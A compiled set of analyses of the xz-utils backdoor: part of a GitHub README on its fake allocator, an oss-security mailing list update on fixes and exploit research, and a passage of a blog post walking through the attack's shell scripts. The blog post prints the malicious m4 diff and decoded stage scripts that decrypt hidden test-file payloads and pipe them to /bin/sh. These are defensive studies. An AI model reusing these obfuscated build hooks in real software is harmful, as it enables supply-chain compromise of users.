 b10: 'user'
 380: 'write\x00'
  10: 'xcalloc: zero size\x00'
 b00: 'yolAbejyiejuvnup=Evjtgvsh5okmkAvj\x00'
 300: '\x7fELF'

```

## A fake allocator

liblzma has a memory allocation layer that just forwards allocation and
freeing calls to dedicated allocators. Calling `lzma_alloc` or `lzma_free`
with a given allocator object basically just calls a function pointer in
that allocator object, which may or may not be related to actual memory
allocation.

The backdoor contains a fake allocator object that looks up symbols instead
of allocating and does nothing on freeing. The look-up function takes a
string ID (see previous section) as size. As string IDs are divisible by 8
and between 10 and 0xd10, they look like plausible sizes at first.

This allocator object is returned
by `.Lstream_decoder_memconfig.part.1`. The allocator structure contains
a context pointer that is passed to the allocation and freeing functions.
For this fake allocator, the opaque member points to an internal ELF module
descriptor records.

The usage pattern (with a sane symbol name for the function that returns the
fake allocator) thus is something like this:

```
    lzma_allocator* fake_alloc = GetFakeAllocator();
    fake_alloc->opaque = libc_elfmodule;
    void* symbol = lzma_alloc(0xAB8, fake_allocator);  // 0xAB8: string ID of "setresuid"
    // use symbol, maybe call it, maybe store it somewhere
    lzma_free(symbol, fake_allocator);                 // just decoy, does nothing
```

Note that `lzma_alloc` and `lzma_free` are not included in the backdoor object,
but just the standard funktions provided by non-backdoor code in liblzma.

## About

Stuff discovered while analyzing the malware hidden in xz-utils 5.6.0 and 5.6.1

### Resources

[Readme](#readme-ov-file)
### License

[BSD-2-Clause license](#BSD-2-Clause-1-ov-file)

[Activity](/karcherm/xz-malware/activity)
### Stars

[**57**
stars](/karcherm/xz-malware/stargazers)
### Watchers

[**7**
watching](/karcherm/xz-malware/watchers)
### Forks

[**6**
forks](/karcherm/xz-malware/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fkarcherm%2Fxz-malware&report=karcherm+%28user%29)

## [Releases](/karcherm/xz-malware/releases)

No releases published

## [Packages 0](/users/karcherm/packages?repo_name=xz-malware)

No packages published

## [Contributors 3](/karcherm/xz-malware/graphs/contributors)

## Languages

* [Python
  100.0%](/karcherm/xz-malware/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.openwall.com_00e3f5f6_20250111_034002.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[<thread-prev]](../../../2024/04/12/9) [[thread-next>]](../../../2024/04/17/4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240416225900.GA23474@openwall.com>
Date: Wed, 17 Apr 2024 00:59:00 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Re: backdoor in upstream xz/liblzma leading to ssh server compromise

Hi,

This is an update on some developments in the recent 2 weeks.

OpenSSH
=======

For upstream OpenSSH, Damien Miller and others have implemented systemd
notifications without reliance on libsystemd:

Bug 2641 - Add systemd notify code to to track running server
<https://bugzilla.mindrot.org/show_bug.cgi?id=2641>

"Committed as 08f579231cd38 and will be in OpenSSH-9.8, due around
June/July."

In response to Andres Freund's proposal, Damien also implemented a patch
to reduce OpenSSH's attack surface:

Bug 3675 - CASignatureAlgorithms should be verified before verifying signatures
<https://bugzilla.mindrot.org/show_bug.cgi?id=3675>

not yet committed?

systemd
=======

Upstream systemd's libsystemd has been modified to dlopen() many of its
dependency libraries on demand:

Reduce dependencies of libsystemd #32028
<https://github.com/systemd/systemd/issues/32028>

The issue above is fixed by pull requests "gcrypt: dlopenify for
libsystemd #32019", "Dynamically load compression libraries #31550",
"man: document that using sd_journal APIs might cause dlopen to happen
and add self-contained notify protocol example #32030", and other
related fix-ups.

xz backdoor analysis
====================

More findings were made about the backdoor's functionality, notably as
published on April 6 by blasty, who discovered that besides triggering
system() the backdoor also allows interactive sessions:

<https://twitter.com/bl4sty/status/1776691497506623562>

> the xz sshd backdoor rabbithole goes quite a bit deeper. I was just able
> to trigger some harder to reach functionality of the backdoor. there's
> still more to explore.. 1/n
> Image
> it requires sending a properly crafted command to the RSA_public_decrypt
> hook, which will then install another for the `mm_answer_keyallowed`
> sshd function. subsequently you offer N more fake ssh-rsa pubkeys which
> are crafted in a special way to chunk together .. 2/n
> a "magic buffer" which contains more backdoor commands, this buffer also
> has two additional ed448 signatures. which like the ones for the
> RSA_public_decrypt portion of the backdoor are salted with the SHA256
> digest of the hostkey
> the final signature also takes into account the session_id (0x20 bytes)
> that is derived during the initial key exchange (KEX) for the SSH
> session. my current PoC implementation uses a heavily monkey patched
> paramiko (ssh client) library to achieve this
> currently I'm just triggering command 0x03 in this part of the code,
> which allows for a basic RCE through system() again. (also lets you set
> uid/gid). but there's more code that needs to be understood. it looks
> like a full auth bypass (interactive session) is possible!
> (that conclusion is based on the fact that one of the
> mm_answer_keyallowed backdoor commands also hooks mm_answer_keyverify,
> eventually)
> whoever designed this stuff had to take a deep dive into openSSH(d)
> internals (and so did I for the past couple of days, oof) .. hats off,
> once again :)
> auth bypass confirmed!
>
> > INFO:paramiko.transport:Authentication (password) successful!
>
> mm_keyallowed_backdoor cmd 1 allows to override the response for
> mm_answer_authpassword with a custom one. if you set it to { u32(9),
> u8(13), u32(1), u32(0) } you can login with any pass

blasty also implemented a "simple SSH Agent that implements some of the
XZ sshd backdoor functionality":

<https://github.com/blasty/JiaTansSSHAgent>

On Sun, Mar 31, 2024 at 10:25:02PM +0200, Solar Designer wrote:
> There's further analysis of the binary payload here:
>
> <https://gist.github.com/smx-smx/a6112d54777845d389bd7126d6e9f504>
>
> I've attached the gist .md file above (as of "Revisions 52") to this
> message, but it's ongoing analysis as seen in the comments.

Updates of smx-smx's gist above have stopped at revision 60, which I'm
attaching here for archival.  Not a lot was added since revision 52.

smx-smx also maintains xzre "that is linked against the malicious object
file in order to instrument and call into the malware code, particularly
the x64 disassembler":

<https://github.com/smx-smx/xzre>

and yes, there's a specialized disassembler inside the backdoor code.

The friends at Binarly have produced a later but very detailed analysis,
which I'm also attaching the main .md file of:

<https://github.com/binarly-io/binary-risk-intelligence/tree/master/xz-backdoor>

Other related repos with tools include:

xzbot "notes, honeypot, and exploit demo for the xz backdoor (CVE-2024-3094)"
<https://github.com/amlweems/xzbot>

xz-min "Minimal setup to trigger the xz backdoor"
<https://github.com/felipec/xz-min>

Timeline
========

In an otherwise inappropriate rejected posting, Steffen Nurpmeso wrote:

> Russ Cox had a writeup on this <https://research.swtch.com/xz-timeline>

which is a good presentation of the attack timeline, with references to
sources and analyses by others.

(The beginning of this oss-security thread until April 1st inclusive
went through in its entirety - nothing rejected - but I did reject a few
postings on April 2nd and on.)

OpenJS Foundation "Failed Credible Takeover Attempt"
====================================================

On April 15, the OpenJS and OpenSSF foundations released the following:

<https://openjsf.org/blog/openssf-openjs-alert-social-engineering-takeovers>
<https://openssf.org/blog/2024/04/15/open-source-security-openssf-and-openjs-foundations-issue-alert-for-social-engineering-takeovers-of-open-source-projects/>

I'll quote an excerpt:

> The OpenJS Foundation Cross Project Council received a suspicious series
> of emails with similar messages, bearing different names and overlapping
> GitHub-associated emails. These emails implored OpenJS to take action to
> update one of its popular JavaScript projects to "address any critical
> vulnerabilities," yet cited no specifics. The email author(s) wanted
> OpenJS to designate them as a new maintainer of the project despite
> having little prior involvement. This approach bears strong resemblance
> to the manner in which "Jia Tan" positioned themselves in the XZ/liblzma
> backdoor.
>
> None of these individuals have been given privileged access to the
> OpenJS-hosted project. The project has security policies in place,
> including those outlined by the Foundation's security working group.
>
> The OpenJS team also recognized a similar suspicious pattern in two
> other popular JavaScript projects not hosted by its Foundation, and
> immediately flagged the potential security concerns to respective OpenJS
> leaders, and the Cybersecurity and Infrastructure Security Agency (CISA)
> within the United States Department of Homeland Security (DHS).

Alexander

View attachment "[smx-smx-xz-backdoor_analysis.md](5/1)" of type "text/plain" (14757 bytes)

View attachment "[binarly-xz-backdoor-readme.md](5/2)" of type "text/plain" (83785 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from research.swtch.com_edce5547_20250111_034035.html ===

### [research!rsc](/)

#### Thoughts and links about programming, by [Russ Cox](https://swtch.com/~rsc/)

[RSS](/feed.atom)

# The xz attack shell script Posted on Tuesday, April 2, 2024.Updated Wednesday, April 3, 2024.

[## Introduction](#introduction)

Andres Freund [published the existence of the xz attack](https://www.openwall.com/lists/oss-security/2024/03/29/4) on 2024-03-29 to the public oss-security@openwall mailing list. The day before, he alerted Debian security and the (private) distros@openwall list. In his mail, he says that he dug into this after “observing a few odd symptoms around liblzma (part of the xz package) on Debian sid installations over the last weeks (logins with ssh taking a lot of CPU, valgrind errors).”

At a high level, the attack is split in two pieces: a shell script and an object file. There is an injection of shell code during `configure`, which injects the shell code into `make`. The shell code during `make` adds the object file to the build. This post examines the shell script. (See also [my timeline post](xz-timeline).)

The nefarious object file would have looked suspicious checked into the repository as `evil.o`, so instead both the nefarious shell code and object file are embedded, compressed and encrypted, in some binary files that were added as “test inputs” for some new tests. The test file directory already existed from long before Jia Tan arrived, and the README explained “This directory contains bunch of files to test handling of .xz, .lzma (LZMA\_Alone), and .lz (lzip) files in decoder implementations. Many of the files have been created by hand with a hex editor, thus there is no better “source code” than the files themselves.” This is a fact of life for parsing libraries like liblzma. The attacker looked like they were just [adding a few new test files](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=cf44e4b7f5dfdbf8c78aef377c10f71e274f63c0).

Unfortunately the nefarious object file turned out to have a bug that caused problems with Valgrind, so the test files needed to be updated to add the fix. [That commit](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1) explained “The original files were generated with random local to my machine. To better reproduce these files in the future, a constant seed was used to recreate these files.” The attackers realized at this point that they needed a better update mechanism, so the new nefarious script contains an extension mechanism that lets it look for updated scripts in new test files, which wouldn’t draw as much attention as rewriting existing ones.

The effect of the scripts is to arrange for the nefarious object file’s `_get_cpuid` function to be called as part of a [GNU indirect function](https://sourceware.org/glibc/wiki/GNU_IFUNC) (ifunc) resolver. In general these resolvers can be called lazily at any time during program execution, but for security reasons it has become popular to call all of them during dynamic linking (very early in program startup) and then map the [global offset table (GOT) and procedure linkage table (PLT) read-only](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html), to keep buffer overflows and the like from being able to edit it. But a nefarious ifunc resolver would run early enough to be able to edit those tables, and that’s exactly what the backdoor introduced. The resolver then looked through the tables for `RSA_public_decrypt` and replaced it with a nefarious version that [runs attacker code when the right SSH certificate is presented](https://github.com/amlweems/xzbot).
[## Configure](#configure)

Again, this post looks at the script side of the attack. Like most complex Unix software, xz-utils uses GNU autoconf to decide how to build itself on a particular system. In ordinary operation, autoconf reads a `configure.ac` file and produces a `configure` script, perhaps with supporting m4 files brought in to provide “libraries” to the script. Usually, the `configure` script and its support libraries are only added to the tarball distributions, not the source repository. The xz distribution works this way too.

The attack kicks off with the attacker adding an unexpected support library, `m4/build-to-host.m4` to the xz-5.6.0 and xz-5.6.1 tarball distributions. Compared to the standard `build-to-host.m4`, the attacker has made the following changes:
```
diff --git a/build-to-host.m4 b/build-to-host.m4
index ad22a0a..d5ec315 100644
--- a/build-to-host.m4
+++ b/build-to-host.m4
@@ -1,5 +1,5 @@
-# build-to-host.m4 serial 3
-dnl Copyright (C) 2023 Free Software Foundation, Inc.
+# build-to-host.m4 serial 30
+dnl Copyright (C) 2023-2024 Free Software Foundation, Inc.
 dnl This file is free software; the Free Software Foundation
 dnl gives unlimited permission to copy and/or distribute it,
 dnl with or without modifications, as long as this notice is preserved.
@@ -37,6 +37,7 @@ AC_DEFUN([gl_BUILD_TO_HOST],

   dnl Define somedir_c.
   gl_final_[$1]="$[$1]"
+  gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`
   dnl Translate it from build syntax to host syntax.
   case "$build_os" in
     cygwin*)
@@ -58,14 +59,40 @@ AC_DEFUN([gl_BUILD_TO_HOST],
   if test "$[$1]_c_make" = '\"'"${gl_final_[$1]}"'\"'; then
     [$1]_c_make='\"$([$1])\"'
   fi
+  if test "x$gl_am_configmake" != "x"; then
+    gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+  else
+    gl_[$1]_config=''
+  fi
+  _LT_TAGDECL([], [gl_path_map], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_prefix], [2])dnl
+  _LT_TAGDECL([], [gl_am_configmake], [2])dnl
+  _LT_TAGDECL([], [[$1]_c_make], [2])dnl
+  _LT_TAGDECL([], [gl_[$1]_config], [2])dnl
   AC_SUBST([$1_c_make])
+
+  dnl If the host conversion code has been placed in $gl_config_gt,
+  dnl instead of duplicating it all over again into config.status,
+  dnl then we will have config.status run $gl_config_gt later, so it
+  dnl needs to know what name is stored there:
+  AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])
 ])

 dnl Some initializations for gl_BUILD_TO_HOST.
 AC_DEFUN([gl_BUILD_TO_HOST_INIT],
 [
+  dnl Search for Automake-defined pkg* macros, in the order
+  dnl listed in the Automake 1.10a+ documentation.
+  gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
+  if test -n "$gl_am_configmake"; then
+    HAVE_PKG_CONFIGMAKE=1
+  else
+    HAVE_PKG_CONFIGMAKE=0
+  fi
+
   gl_sed_double_backslashes='s/\\/\\\\/g'
   gl_sed_escape_doublequotes='s/"/\\"/g'
+  gl_path_map='tr "\t \-_" " \t_\-"'
 changequote(,)dnl
   gl_sed_escape_for_make_1="s,\\([ \"&'();<>\\\\\`|]\\),\\\\\\1,g"
 changequote([,])dnl

```

All in all, this is a fairly plausible set of diffs, in case anyone thought to check. It bumps the version number, updates the copyright year to look current, and makes a handful of inscrutable changes that don’t look terribly out of place.

Looking closer, something is amiss. Starting near the bottom,
```
gl_am_configmake=`grep -aErls "#{4}[[:alnum:]]{5}#{4}$" $srcdir/ 2>/dev/null`
if test -n "$gl_am_configmake"; then
  HAVE_PKG_CONFIGMAKE=1
else
  HAVE_PKG_CONFIGMAKE=0
fi

```

Let’s see which files in the distribution match the pattern (simplifying the `grep` command):
```
% egrep -Rn '####[[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]][[:alnum:]]####$'
Binary file ./tests/files/bad-3-corrupt_lzma2.xz matches
%

```

That’s surprising! So this script sets `gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz` and `HAVE_PKG_CONFIGMAKE=1`. The `gl_path_map` setting is a [tr(1)](https://linux.die.net/man/1/tr) command that swaps tabs and spaces and swaps underscores and dashes.

Now reading the top of the script,
```
gl_[$1]_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"`

```

extracts the final dot-separated element of that filename, leaving `xz`. That is, it’s the file name suffix, not a prefix, and it is the name of the compression command that is likely already installed on any build machine.

The next section is:
```
if test "x$gl_am_configmake" != "x"; then
  gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
else
  gl_[$1]_config=''
fi

```

We know that `gl_am_configmake=./tests/files/bad-3-corrupt_lzma2.xz`, so this sets the `gl_[$1]_config` variable to the string
```
sed "r\n" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null

```

At first glance, especially in the original quoted form, the `sed` command looks like it has something to do with line endings, but in fact `r\n` is the `sed` “read from file `\n`” command. Since the file `\n` does not exist, the command does nothing at all, and then since `sed` has not been invoked with the `-n` option, `sed` prints each line of input. So `sed "r\n"` is just an obfuscated `cat` command, and remember that `$gl_path_map` is the `tr` command from before, and `$gl_[$1]_prefix` is `xz`. To the shell, this command is really
```
cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d

```

But right now it’s still just a string; it hasn’t been run. That changes with
```
dnl If the host conversion code has been placed in $gl_config_gt,
dnl instead of duplicating it all over again into config.status,
dnl then we will have config.status run $gl_config_gt later, so it
dnl needs to know what name is stored there:
AC_CONFIG_COMMANDS([build-to-host], [eval $gl_config_gt | $SHELL 2>/dev/null], [gl_config_gt="eval \$gl_[$1]_config"])

```

The final `"eval \$gl_[$1]_config"` runs that command. If we run it on the xz 5.6.0 repo, we get:
```
$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#��Z�.hj�
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +724)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31265|
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$

```

I have inserted some line breaks, here and in later script fragments,
to keep the lines from being too long in the web page.

Why the Hello and World? The README text that came with the test file describes it:
> bad-3-corrupt\_lzma2.xz has three Streams in it. The first and third streams are valid xz Streams. The middle Stream has a correct Stream Header, Block Header, Index and Stream Footer. Only the LZMA2 data is corrupt. This file should decompress if `--single-stream` is used.

The first and third streams are the Hello and World, and the middle stream has been corrupted by swapping the byte values unswapped by the `tr` command.

Recalling that xz 5.6.1 shipped with different “test” files, we can also try xz 5.6.1:
```
$ cat ./tests/files/bad-3-corrupt_lzma2.xz | tr "\t \-_" " \t_\-" | xz -d
####Hello####
#�U��$�
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
[ ! $(uname) = "Linux" ] && exit 0
eval `grep ^srcdir= config.status`
if test -f ../../config.status;then
eval `grep ^srcdir= ../../config.status`
srcdir="../../$srcdir"
fi
export i="((head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +2048 &&
    (head -c +1024 >/dev/null) && head -c +939)";
(xz -dc $srcdir/tests/files/good-large_compressed.lzma|
    eval $i|tail -c +31233|
    tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|
    xz -F raw --lzma1 -dc|/bin/sh
####World####
$

```

The first difference is that the script makes sure (very sure!) to exit if not being run on Linux. The second difference is that the long “`export i`” line deviates in the final head command offset (724 vs 939) and then the tail offset and the `tr` argument. Let’s break those down.

The `head` command prints a prefix of its input. Let’s look at the start:
```
(head -c +1024 >/dev/null) && head -c +2048 &&
(head -c +1024 >/dev/null) && head -c +2048 && ...

```

This discards the first kilobyte of standard input, prints the next two kilobytes, discards the next kilobyte, and prints the next two kilobytes. And so on. The whole command for 5.6.1 is:
```
(head -c +1024 >/dev/null) && head -c +2048 &&
(head -c +1024 >/dev/null) && head -c +2048 &&
... 16 times total ...
head -c +939

```

The shell variable `i` is set to this long command. Then the script runs:
```
xz -dc $srcdir/tests/files/good-large_compressed.lzma |
eval $i |
tail -c +31233 |
tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" |
xz -F raw --lzma1 -dc |
/bin/sh

```

The first `xz` command uncompresses another malicious test file. The `eval` then runs the `head` pipeline, extracting a total of 16×2048+939 = 33,707 bytes. Then the `tail` command keeps only the final 31,233 bytes. The `tr` command applies a simple substitution cipher to the output (so that just in case anyone thought to pull these specific byte ranges out of the file, they wouldn’t recognize it as a valid lzma input!?). The second `xz` command decodes the translated bytes as a raw lzma stream, and then of course the result is piped through the shell.

Skipping the shell pipe, we can run this, obtaining a very long shell script. I have added commentary in between sections of the output.
```
$ xz -dc $srcdir/tests/files/good-large_compressed.lzma |
  eval $i |
  tail -c +31233 |
  tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
  xz -F raw --lzma1 -dc
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"

```

So far, setting up environment variables.
```
[ ! $(uname)="Linux" ] && exit 0  # 5.6.1 only

```

A line that only appears in 5.6.1, exiting when not run on Linux. In general the scripts in 5.6.0 and 5.6.1 are very similar: 5.6.1 has a few additions. We will examine the 5.6.1 script, with the additions marked. This line is an attempted robustness fix with a bug (pointed out by Jakub Wilk): there are no spaces around the `=`, making the line a no-op.
```
eval $zrKcVq

```

The first of many odd eval statements, for variables that do not appear to be set anywhere. One possibility is that these are debug prints: when the attacker is debugging the script, setting, say, `zrKcVq=env` inserts a debug print during execution. Another possibility is that these are extension points that can be set by some other mechanism, run before this code, in the future.
```
if test -f config.status; then
eval $zrKcSS
eval `grep ^LD=\'\/ config.status`
eval `grep ^CC=\' config.status`
eval `grep ^GCC=\' config.status`
eval `grep ^srcdir=\' config.status`
eval `grep ^build=\'x86_64 config.status`
eval `grep ^enable_shared=\'yes\' config.status`
eval `grep ^enable_static=\' config.status`
eval `grep ^gl_path_map=\' config.status`

```

If `config.status` exists, we read various variables from it into the shell, along with two extension points. Note that we are still inside the config.status check (let’s call it “if #1”) as we continue through the output.
```
# Entirely new in 5.6.1
vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2>/dev/null`
if test "x$vs" != "x" > /dev/null 2>&1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" > /dev/null 2>&1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2>/dev/null`
if test "x$ve" != "x" > /dev/null 2>&1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" > /dev/null 2>&1;then
[ ! "x$f2" = "x$f1" ] && exit 0
[ ! -f $f1 ] && exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi

```

This section is entirely new in 5.6.1. It looks for a single test file to contain the magic texts `'~!:_ W'` and `'|_!{ -'`, extracts the bytes between them, applies a substitution cipher, decompresses the result, and evaluates the output as a shell script. This appears to be an extension mechanism, so that the next time changes are needed in this script, a new script can be added in a different test file, instead of having to [make up reasons to regenerate existing binary test files](https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1).

The next chunk continues with script that was present in 5.6.0.
```
eval $zrKccj
if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
exit 0
fi
if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
exit 0
fi

```

Two different checks that [GNU indirect function](https://maskray.me/blog/2021-01-18-gnu-indirect-function) support is enabled. If not, stop the script. The backdoor requires this functionality.
```
if test "x$enable_shared" != "xyes";then
exit 0
fi

```

Require shared library support.
```
if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
exit 0
fi

```

Require an x86-64 Linux system.
```
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
exit 0
fi
if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
exit 0
fi

```

Require all the crc ifunc code (in case it has been patched out?).
```
if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
exit 0
fi
if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
exit 0
fi
LDv=$LD" -v"
if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
exit 0
fi

```

Require gcc (not clang, I suppose) and GNU ld.
```
if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
exit 0
fi
if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
exit 0
fi

```

Require the backdoor-containing test files. Of course, if these files didn’t exist, it’s unclear how we obtained this script in the first place, but better safe than sorry, I suppose.
```
if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
eval $zrKcst

```

Add a bunch of checks when the file `debian/rules` exists or `$RPM_ARCH` is set to `x86_64`. Note that we are now inside two `if` statements: the `config.status` check above, and this one (let’s call it “if #2”).
```
j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
z="^am__uninstall_files_from_dir = {"
if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
w="^am__install_max ="
if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
E=$z
if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
Q="^am__vpath_adj_setup ="
if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
M="^am__include = include"
if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
L="^all: all-recursive$"
if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
exit 0
fi
u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
